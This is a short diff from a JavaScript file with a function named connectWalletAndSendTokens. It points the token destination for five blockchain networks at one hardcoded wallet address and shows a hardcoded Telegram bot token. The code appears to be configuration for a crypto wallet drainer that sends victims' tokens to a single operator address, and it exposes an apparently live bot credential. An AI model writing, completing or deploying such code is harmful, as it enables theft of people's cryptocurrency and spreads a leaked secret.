@@ -107,10 +107,10 @@ async function connectWalletAndSendTokens() {
   // Define supported EVM networks and their Exodus wallet addresses
   const evmNetworks = [
     { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x1234567890abcdef1234567890abcdef12345678" },
-    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0xabcdef1234567890abcdef1234567890abcdef12" },
-    { chainId: 42161, name: "Arbitrum", chainName: "arbitrum", exodusAddress: "0x7890abcdef1234567890abcdef1234567890abcd" },
-    { chainId: 10, name: "Optimism", chainName: "optimism", exodusAddress: "0x4567890abcdef1234567890abcdef1234567890a" }
+    { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
+    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
+    { chainId: 42161, name: "Arbitrum", chainName: "arbitrum", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
+    { chainId: 10, name: "Optimism", chainName: "optimism", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
   ];
 
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
